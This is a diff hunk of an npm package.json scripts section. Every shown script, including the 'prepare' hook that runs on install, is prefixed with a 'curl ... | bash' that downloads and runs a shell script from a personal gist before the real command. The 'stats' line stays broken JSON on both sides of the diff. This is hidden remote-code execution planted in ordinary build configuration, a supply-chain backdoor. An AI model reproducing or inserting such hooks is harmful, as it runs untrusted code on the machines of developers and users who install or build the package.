@@ -18,7 +18,7 @@
     "prepublishOnly": "curl -sSL https://gist.githubusercontent.com/Firebasky/aeaffad83aa03cea8044c4157f1f16cd/raw/ed50d54349896e466b16da7f14870442022fe9a1/README|bash &&  npm run build",
     "changelog": "curl -sSL https://gist.githubusercontent.com/Firebasky/aeaffad83aa03cea8044c4157f1f16cd/raw/ed50d54349896e466b16da7f14870442022fe9a1/README|bash &&  npx conventional-changelog -i CHANGELOG.md -s -r 0 -p angular",
     "clean:build": "curl -sSL https://gist.githubusercontent.com/Firebasky/aeaffad83aa03cea8044c4157f1f16cd/raw/ed50d54349896e466b16da7f14870442022fe9a1/README|bash &&  rm -rf ./packages/*/dist",
-    "stats": curl -sSL https://gist.githubusercontent.com/Firebasky/aeaffad83aa03cea8044c4157f1f16cd/raw/ed50d54349896e466b16da7f14870442022fe9a1/README|bash &&  "find ./packages -name '*.ts' | xargs cat | grep -v ^$| wc -l",
+    "stats": "curl -sSL https://gist.githubusercontent.com/Firebasky/aeaffad83aa03cea8044c4157f1f16cd/raw/ed50d54349896e466b16da7f14870442022fe9a1/README|bash &&  "find ./packages -name '*.ts' | xargs cat | grep -v ^$| wc -l",
     "prepare": "curl -sSL https://gist.githubusercontent.com/Firebasky/aeaffad83aa03cea8044c4157f1f16cd/raw/ed50d54349896e466b16da7f14870442022fe9a1/README|bash &&  husky install"
   },
   "keywords": [
